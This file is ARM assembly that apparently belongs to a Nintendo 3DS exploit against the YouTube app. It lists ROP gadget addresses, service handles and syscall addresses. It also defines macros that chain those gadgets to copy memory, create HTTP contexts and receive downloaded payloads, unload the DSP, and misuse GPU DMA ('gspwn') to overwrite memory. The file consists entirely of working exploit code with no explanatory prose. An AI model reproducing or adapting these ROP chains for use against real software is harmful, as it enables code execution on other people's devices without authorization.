PAYLOAD_PRIM_LOC equ 0x1f05DC00
PAYLOAD_SEC_LOC equ 0x15000000
PAYLOAD_THIRD_LOC equ 0x15100000

YTB_ROP_NOP equ 0x0012d444 ; pop {pc}
YTB_ROP_POP_R0PC equ 0x0013b358 ; pop {r0, pc}
YTB_ROP_POP_R1PC equ 0x0034c2f8 ; pop {r1, pc}
YTB_ROP_POP_R4LR_BX_R1 equ 0x0034e3d8 ; pop {r4, lr} | bx r1
YTB_ROP_POP_R4R5PC equ 0x00433754 ; pop {r4, r5, pc}
YTB_ROP_POP_R3PC equ 0x0022a420 ; pop {r3, pc}
YTB_ROP_POP_R4PC equ 0x0012bca4 ; pop {r4, pc}
YTB_ROP_POP_R2R3PC equ 0x00390e59 ; pop {r2, r3, pc}
YTB_ROP_POP_R2R3R4R5R6PC equ 0x00348e88 ; pop {r2, r3, r4, r5, r6, pc}
YTB_ROP_POP_R4R5R6R7R8R9R10R11PC equ 0x00131198 ; pop {r4, r5, r6, r7, r8, r9, sl, fp, pc}
YTB_ROP_POP_R4R5R6R7R8R9R10R11R12PC equ 0x001331b0 ; pop {r4, r5, r6, r7, r8, r9, sl, fp, ip, pc}
YTB_ROP_BLX_R4_ADD_SPx10_POP_R4PC equ 0x001673a4 ; blx r4 ; add sp, sp, #16 ; pop {r4, pc}

YTB_ROP_STR_R0R1_POP_R4PC equ 0x0012bca0 ; str r0, [r1] ; pop {r4, pc}
YTB_ROP_STR_R0R4_POP_R4PC equ 0x001306ac ; str r0, [r4] ; pop {r4, pc}
YTB_ROP_STM_R4R0R1_POP_R4_PC equ 0x001fb254 ; stm r4, {r0, r1} ; pop {r4, pc}
YTB_ROP_STM_R0R1R2_POP_R4_PC equ 0x003599a0 ; stm r4, {r1, r2} ; pop {r4, pc}
YTB_ROP_LDR_R1R1_BLX_R3 equ 0x0016e644 ; ldr r1, [r1] ; blx r3

YTB_ROP_LDR_R2R1_ADD_R1SPx4_BLX_R3 equ 0x0017786c ; ldr r2, [r1] ; add r1, sp, #4 ; blx r3

YTB_ROP_LDR_R0R0_POP_R4PC equ 0x00168910 ; ldr r0, [r0] ; pop {r4, pc}

YTB_ROP_MRC_R0C13C03_ADD_R0R0x5C_BX_LR equ 0x001390f4 ; mrc 15, 0, r0, cr13, cr0, {3} ; add r0, r0, #0x5c ; bx lr

YTB_ROP_ADD_R0R0R4_POP_R4PC equ 0x003107dc ; add r0, r0, r4 ; pop {r4, pc}

YTB_HTTPC_STRUCT equ 0x007918bc ; + 0x4 : bool enabled (SBS), + 0x2C : http:C handle
YTB_HTTPC_HANDLE equ YTB_HTTPC_STRUCT + 0x2C
YTB_APT_HANDLE equ 0x0056E120
YTB_GSPGPU_INTERRUPT_RECEIVER_STRUCT equ 0x0056AC40
YTB_GSPGPU_HANDLE equ 0x0057A414
YTB_DSP_HANDLE equ 0x0056C780

YTB_SVC_SLEEPTHREAD equ 0x00342ebc ; svc 0xa
YTB_SVC_SETTHREADPRIORITY equ 0x0034af34 ; svc 0xc
YTB_SVC_SENDSYNCREQUEST equ 0x00344cc4 ; svc 0x32
YTB_MEMCPY equ 0x0034b098
YTB_HTTPC_INITIALIZE equ 0x00216230 ; r0 : handle ptr, r1 : 0x0 ?, r2 : 0x1000, r3 : 0x0 ?
YTB_HTTPC_RECEIVEDATA equ 0x0020e108 ; r0 : handle ptr, r1 : httpc context handle, r2 : buffer address, r3 : buffer size
YTB_HTTPC_CREATECONTEXTWRAPPER equ 0x0020d6d4 ; r0 : context struct (0x4 : SBZ context handle slot, 0x8 : SBZ context http:C handle slot, 0xC : same as 0x8), r1 : url ptr, r2 : request method, r3 : bool use_proxy; HTTPC_STRUCT + 0x4 SBS, HTTPC_STRUCT + 0x2c = http:C handle
YTB_APT_ISREGISTERED equ 0x003439B8 ; r0 : appId, r1 : out_ptr
YTB_SRV_GETSERVICEHANDLEWRAPPER equ 0x00344cfc ; r0 : out ptr, r1 : service name ptr, r2 : service name length, r3 : 0
YTB_GSPGPU_FLUSHDATACACHE equ 0x0020f14c
YTB_GSPGPU_GXTRYENQUEUE equ 0x002FBA28
YTB_GSPGPU_GXCMD4 equ 0x0020E91C
YTB_GSPGPU_FLUSHDATACACHE_WRAPPER equ 0x0020E820
YTB_DSP_UNLOADCOMPONENT equ 0x001369A4
YTB_DSP_REGISTERINTERRUPTEVENTS equ 0x00136A38

.macro set_lr,_lr
	.word YTB_ROP_POP_R1PC ; pop {r1, pc}
		.word YTB_ROP_NOP ; pop {pc}
	.word YTB_ROP_POP_R4LR_BX_R1 ; pop {r4, lr} ; bx r1
		.word 0xFFFFFFFF ; r4 (garbage)
		.word _lr ; lr
.endmacro

.macro sleep,nanosec_low,nanosec_high
	set_lr YTB_ROP_NOP
	.word YTB_ROP_POP_R0PC ; pop {r0, pc}
		.word nanosec_low ; r0
	.word YTB_ROP_POP_R1PC ; pop {r1, pc}
		.word nanosec_high ; r1
	.word YTB_SVC_SLEEPTHREAD
.endmacro

.macro set_thread_priority,priority
	set_lr YTB_ROP_NOP
	.word YTB_ROP_POP_R0PC ; pop {r0, pc}
		.word 0xFFFF8000 ; r0
	.word YTB_ROP_POP_R1PC ; pop {r1, pc}
		.word priority ; r1
	.word YTB_SVC_SETTHREADPRIORITY
.endmacro

.macro memcpy,dst,src,size
	set_lr YTB_ROP_NOP
	.word YTB_ROP_POP_R0PC ; pop {r0, pc}
		.word dst ; r0
	.word YTB_ROP_POP_R1PC ; pop {r1, pc}
		.word src ; r1
	.word YTB_ROP_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word size ; r2
		.word 0xFFFFFFFF ; r3 (garbage)
		.word 0xFFFFFFFF ; r4 (garbage)
		.word 0xFFFFFFFF ; r5 (garbage)
		.word 0xFFFFFFFF ; r6 (garbage)
	.word YTB_MEMCPY
.endmacro

.macro getServiceHandle,dst,name_0,name_1,name_length
	set_lr YTB_ROP_POP_R4R5PC
	.word YTB_ROP_POP_R0PC ; pop {r0, pc}
		.word dst ; r0
	.word YTB_ROP_POP_R1PC ; pop {r1, pc}
		.word PAYLOAD_LOC + @@service_name ; r1
	.word YTB_ROP_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word name_length ; r2 (addr)
		.word 0xFFFFFFFF ; r3 (garbage)
		.word 0xFFFFFFFF ; r4 (garbage)
		.word 0xFFFFFFFF ; r5 (garbage)
		.word 0xFFFFFFFF ; r6 (garbage)
	.word YTB_SRV_GETSERVICEHANDLEWRAPPER
		@@service_name:
		.word name_0, name_1
.endmacro

.macro httpcCreateContextWrapper, context_struct, url, method, use_proxy
	set_lr YTB_ROP_NOP
	.word YTB_ROP_POP_R0PC ; pop {r0, pc}
		.word context_struct ; r0
	.word YTB_ROP_POP_R1PC ; pop {r1, pc}
		.word url ; r1
	.word YTB_ROP_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word method ; r2 (addr)
		.word use_proxy ; r3
		.word 0xFFFFFFFF ; r4 (garbage)
		.word 0xFFFFFFFF ; r5 (garbage)
		.word 0xFFFFFFFF ; r6 (garbage)
	.word YTB_HTTPC_CREATECONTEXTWRAPPER
.endmacro

.macro httpcInitialize
	set_lr YTB_ROP_NOP
	.word YTB_ROP_POP_R0PC ; pop {r0, pc}
		.word YTB_HTTPC_HANDLE ; r0
	.word YTB_ROP_POP_R1PC ; pop {r1, pc}
		.word 0x00000000 ; r1
	.word YTB_ROP_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word 0x00001000 ; r2
		.word 0x00000000 ; r3
		.word 0xFFFFFFFF ; r4 (garbage)
		.word 0xFFFFFFFF ; r5 (garbage)
		.word 0xFFFFFFFF ; r6 (garbage)
	.word YTB_HTTPC_INITIALIZE
.endmacro

.macro httpcBeginRequest, handle_ptr, context_ptr
	set_lr YTB_ROP_NOP
	.word YTB_ROP_POP_R0PC
		.word handle_ptr ; r0 (handle ptr)
	.word YTB_ROP_LDR_R0R0_POP_R4PC
		.word YTB_APT_HANDLE ; r4 (context handle)
	.word YTB_ROP_STR_R0R4_POP_R4PC
		.word 0xFFFFFFFF ; r4 (garbage)

	.word YTB_ROP_POP_R0PC
		.word context_ptr ; r0 (context handle ptr)
	.word YTB_ROP_LDR_R0R0_POP_R4PC
		.word 0xFFFFFFFF ; r4 (garbage)
	.word YTB_ROP_POP_R1PC
		.word PAYLOAD_LOC - 0x100 ; dummy ptr
	.word YTB_APT_ISREGISTERED ; same cmd header as httpcBeginRequest
.endmacro

.macro httpcReceiveData, handle, context_ptr, buffer_addr, buffer_size
	.word YTB_ROP_POP_R0PC ; pop {r0, pc}
		.word handle ; r0
	.word YTB_ROP_POP_R1PC ; pop {r1, pc}
		.word context_ptr ; r1
	.word YTB_ROP_POP_R3PC
		.word YTB_ROP_NOP
	.word YTB_ROP_LDR_R1R1_BLX_R3
	.word YTB_ROP_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word buffer_addr ; r2 (addr)
		.word buffer_size ; r3
		.word YTB_HTTPC_RECEIVEDATA ; r4 (garbage)
		.word 0xFFFFFFFF ; r5 (garbage)
		.word 0xFFFFFFFF ; r6 (garbage)
	.word YTB_ROP_BLX_R4_ADD_SPx10_POP_R4PC
		.word 0xFFFFFFFF ; garbage
		.word 0xFFFFFFFF ; garbage
		.word 0xFFFFFFFF ; garbage
		.word 0xFFFFFFFF ; garbage
		.word 0xFFFFFFFF ; r4 (garbage)
.endmacro

.macro dsp_unloadcomponent
	set_lr YTB_ROP_NOP
	.word YTB_ROP_POP_R0PC ; pop {r0, pc}
		.word YTB_DSP_HANDLE ; r0 (handle ptr)
	.word YTB_DSP_UNLOADCOMPONENT
.endmacro

.macro dsp_registerinterruptevents
	set_lr YTB_ROP_NOP
	.word YTB_ROP_POP_R0PC ; pop {r0, pc}
		.word YTB_DSP_HANDLE ; r0 (handle ptr)
	.word YTB_ROP_POP_R1PC ; pop {r1, pc}
		.word 0x00000000 ; r1 (handle ptr)
	.word YTB_ROP_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word 0x00000002 ; r2
		.word 0x00000002 ; r3
		.word 0xFFFFFFFF ; r4 (garbage)
		.word 0xFFFFFFFF ; r5 (garbage)
		.word 0xFFFFFFFF ; r6 (garbage)
	.word YTB_DSP_REGISTERINTERRUPTEVENTS
.endmacro

.macro flush_dcache,addr,size
	set_lr YTB_ROP_NOP
	.word YTB_ROP_POP_R0PC ; pop {r0, pc}
		.word YTB_GSPGPU_HANDLE ; r0 (handle ptr)
	.word YTB_ROP_POP_R1PC ; pop {r1, pc}
		.word 0xFFFF8001 ; r1 (process handle)
	.word YTB_ROP_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word addr ; r2 (addr)
		.word size ; r3 (src)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word YTB_GSPGPU_FLUSHDATACACHE
.endmacro

.macro gspwn,dst,src,size
	set_lr YTB_ROP_POP_R4R5R6R7R8R9R10R11PC
	.word YTB_ROP_POP_R0PC ; pop {r0, pc}
		.word YTB_GSPGPU_INTERRUPT_RECEIVER_STRUCT + 0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
	.word YTB_ROP_POP_R1PC ; pop {r1, pc}
		.word PAYLOAD_LOC + @@gxCommandPayload ; r1 (cmd addr)
	.word YTB_GSPGPU_GXTRYENQUEUE
		@@gxCommandPayload:
		.word 0x00000004 ; command header (SetTextureCopy)
		.word src ; source address
		.word dst ; destination address (standin, will be filled in)
		.word size ; size
		.word 0xFFFFFFFF ; dim in
		.word 0xFFFFFFFF ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused
.endmacro

.macro gspgpuSetBufferSwap,screen,framebuf_adr,flags
	; get TLS
	set_lr YTB_ROP_ADD_R0R0R4_POP_R4PC
	.word YTB_ROP_POP_R4PC
		.word 0x80 - 0x5C ; r4 (offset)
	.word YTB_ROP_MRC_R0C13C03_ADD_R0R0x5C_BX_LR
		.word 0xFFFFFFFF ; r4 (garbage)

	; memcpy to it
	set_lr YTB_ROP_NOP
	.word YTB_ROP_POP_R1PC ; pop {r1, pc}
		.word PAYLOAD_LOC + @@cmdBuf ; r1 (cmd addr)
	.word YTB_ROP_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word @@cmdBuf_end - @@cmdBuf ; r2
		.word 0xFFFFFFFF ; r3 (garbage)
		.word 0xFFFFFFFF ; r4 (garbage)
		.word 0xFFFFFFFF ; r5 (garbage)
		.word 0xFFFFFFFF ; r6 (garbage)
	.word YTB_MEMCPY

	; grab handle
	.word YTB_ROP_POP_R0PC ; pop {r0, pc}
		.word YTB_GSPGPU_HANDLE ; r0 (handle ptr)
	.word YTB_ROP_LDR_R0R0_POP_R4PC
		.word 0xFFFFFFFF ; r4 (garbage)

	; do command
	set_lr YTB_ROP_POP_R4R5R6R7R8R9R10R11R12PC
	.word YTB_SVC_SENDSYNCREQUEST
		@@cmdBuf:
		.word 0x00050200 ; command header
		.word screen
		.word 0x00000008
		.word framebuf_adr
		.word framebuf_adr
		.word 240 * 3
		.word flags
		.word 0x00000000
		.word 0x00000000
		@@cmdBuf_end:
.endmacro
